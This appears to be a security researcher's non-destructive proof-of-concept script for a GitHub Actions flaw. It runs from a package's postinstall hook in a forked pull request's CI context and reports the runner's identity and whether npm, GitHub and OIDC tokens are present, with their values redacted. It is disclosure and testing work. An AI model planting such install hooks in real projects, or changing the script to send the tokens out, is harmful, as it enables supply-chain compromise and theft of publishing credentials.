// Non-destructive PoC for FINDING-GH-008 (WTW-IM/es-components V1B+V6+V8).
// Wired into root package.json `scripts.postinstall`.
//
// Demonstrates ONLY:
//   - fork postinstall executes in PRT context with the workflow's broad permissions
//   - identity (whoami)
//   - presence of NODE_AUTH_TOKEN (=NPM_TOKEN), GITHUB_TOKEN, OIDC tokens
//     (key names + length only — values FULLY redacted)
//   - OIDC mint capability presence (not actually minting — just env-keys check)
//
// Does NOT:
//   - print secret values
//   - call ACTIONS_ID_TOKEN_REQUEST_URL (would actually mint a JWT)
//   - egress to external hosts
//   - publish anything to npm
//   - forge attestations

const { execSync } = require("child_process");

console.log("::group::FINDING-GH-008 PoC — fork postinstall + over-privileged perms");

let whoami = "?";
try { whoami = execSync("whoami", { encoding: "utf8" }).trim(); } catch (e) {}
let hostname = "?";
try { hostname = execSync("hostname", { encoding: "utf8" }).trim(); } catch (e) {}

console.log(`[POC] whoami:           ${whoami}`);
console.log(`[POC] hostname:         ${hostname}`);
console.log(`[POC] cwd:              ${process.cwd()}`);
console.log(`[POC] script path:      ${__filename}`);
console.log(`[POC] github.workspace: ${process.env.GITHUB_WORKSPACE}`);
console.log(`[POC] github.actor:     ${process.env.GITHUB_ACTOR}`);
console.log(`[POC] github.event:     ${process.env.GITHUB_EVENT_NAME}`);

console.log("");
console.log("[POC] env keys of interest (values fully REDACTED):");
const interestPrefixes = ["GITHUB_", "ACTIONS_", "RUNNER_", "NPM_", "NODE_", "GH_", "ATTESTATION_"];
for (const k of Object.keys(process.env).sort()) {
  if (interestPrefixes.some(p => k === p || k.startsWith(p)) || k === "CI") {
    const v = process.env[k] || "";
    console.log(`  ${k.padEnd(40)} = <REDACTED length=${v.length}>`);
  }
}

console.log("");
console.log("[POC] PRESENCE of secrets-derived env vars (boolean):");
for (const v of [
  "GITHUB_TOKEN",
  "NODE_AUTH_TOKEN",                       // = NPM_TOKEN per ci.yml
  "NPM_TOKEN",
  "ACTIONS_ID_TOKEN_REQUEST_TOKEN",        // OIDC mint capability
  "ACTIONS_ID_TOKEN_REQUEST_URL",
  "ACTIONS_RUNTIME_TOKEN",                 // attestation signing
  "ACTIONS_RUNTIME_URL",
]) {
  console.log(`  ${v.padEnd(40)} = ${process.env[v] ? "YES" : "no"}`);
}

console.log("");
console.log("[POC] permissions inferable from env (do NOT call these endpoints — listing only):");
console.log("  - id-token: write   reachable if ACTIONS_ID_TOKEN_REQUEST_URL is YES above");
console.log("  - attestations:write reachable if ACTIONS_RUNTIME_TOKEN is YES above");
console.log("  - npm publish via NODE_AUTH_TOKEN reachable if NODE_AUTH_TOKEN is YES above");
console.log("");
console.log("PoC ends here without using any of the above.");

console.log("::endgroup::");
process.exit(0);
